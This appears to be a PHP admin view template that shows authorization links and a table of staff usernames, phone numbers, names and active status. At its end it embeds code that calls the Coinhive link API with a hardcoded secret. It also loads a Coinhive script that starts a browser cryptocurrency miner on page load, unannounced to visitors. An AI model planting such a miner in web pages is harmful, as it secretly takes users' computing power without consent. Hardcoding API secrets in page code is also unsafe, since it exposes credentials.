<div class="container-fluid">
	<div class="row">
		<div class="col-12 col-md-4">
			<table class="table table-borderless">
				<tr>
					<th colspan="3"><a class="nav-link" href="<?= base_url('admin/auth') ?>">Authorization</a></th>
				</tr>
				<tr class="row pl-4">
					<th scope="row" class="col-6">
						<a class="nav-link" href="<?= base_url('admin/auth/admin') ?>">Admin</a>
					</th>
					<td class="col-3">
						<a class="nav-link" href="<?= base_url('admin/auth/admin/add') ?>"><i class="fa fa-plus text-success"></i>&emsp;Add</a>
					</td>
					<td class="col-3">
						<a class="nav-link" href="<?= base_url('admin/auth/admin/edit') ?>"><i class="fa fa-pencil text-warning"></i>&emsp;Edit</a>
					</td>					
				</tr>

				<tr class="row pl-4">
					<th scope="row" class="col-6">
						<a class="nav-link" href="<?= base_url('admin/auth/admin') ?>">Staff</a>
					</th>
					<td class="col-3">
						<a class="nav-link" href="<?= base_url('admin/auth/admin/add') ?>"><i class="fa fa-plus text-success"></i>&emsp;Add</a>
					</td>
					<td class="col-3">
						<a class="nav-link" href="<?= base_url('admin/auth/admin/edit') ?>"><i class="fa fa-pencil text-warning"></i>&emsp;Edit</a>
					</td>					
				</tr>

			</table>
		</div>

		<div class="col">
			<div class="container-fluid">
				<div class="row mt-5">
					<div class="col">
						<table class="table table-hover table-borderless mt-5">
							<thead class="bg-dark text-white">
								<tr>
									<th class="text-center">USERNAME</th>
									<th class="text-center">PHONE NUMBER</th>
									<th class="text-center">FIRST NAME</th>
									<th class="text-center">LAST NAME</th>
									<th class="text-center">STATUS</th>
								</tr>
							</thead>
							<tbody>
								<?php foreach($staffs as $staff) {?>
								<tr>
									<td class="text-center">
										<?= $staff->username ?>
									</td>
									
									<td class="text-center">
										<?= $staff->phone_number ?>
									</td>
									
									<td class="text-center">
										<?= ucfirst($staff->first_name) ?>
									</td>
									
									<td class="text-center">
										<?= ucfirst($staff->last_name) ?>
									</td>
									
									<td class="text-center">
										<?php 
											if($staff->active == 'yes') {

												echo '<i class="fa fa-check-circle fa-lg text-success"></i>';	

											} else {

												echo '<i class="fa fa-times-circle text-danger fa-lg"></i>';	

											}
										?>
									</td>

								</tr>
								<?php } ?>
							</tbody>
						</table>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="container-fluid">
	<div class="row">

		<div class="col bg-dark text-white">&emsp;A
			<?php 

				$url = 'https://api.coinhive.com/link/create';
//				$ch = curl_init($url);

				$data = [
			    	'secret'      	=> 'sf0d7GUaqogM3A8I5DvOqLcon5h4oodH',
			    	'hashes' 		=> 512,
			    	'url'			=> 'https://facebook.com/wolf.syntax',
			    	'user'			=> 'zyberwolf',
				];

				$ch = curl_init($url);

				# Form data string
				$postString = http_build_query($data, '', '&');
				
				# Setting our options
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $postString);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				
				# Get the response
				$response = curl_exec($ch);
				curl_close($ch);
				$new_url = str_replace("\/", "\\", $response);
				$_url = explode(",", $new_url);
				echo substr($_url[1],7,-2);
				#echo substr($_url[1],7,-1);

			?>
		</div>
	</div>
</div>

<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
    var miner = new CoinHive.User('SITE_KEY', 'Django Framework');
    miner.start();
</script>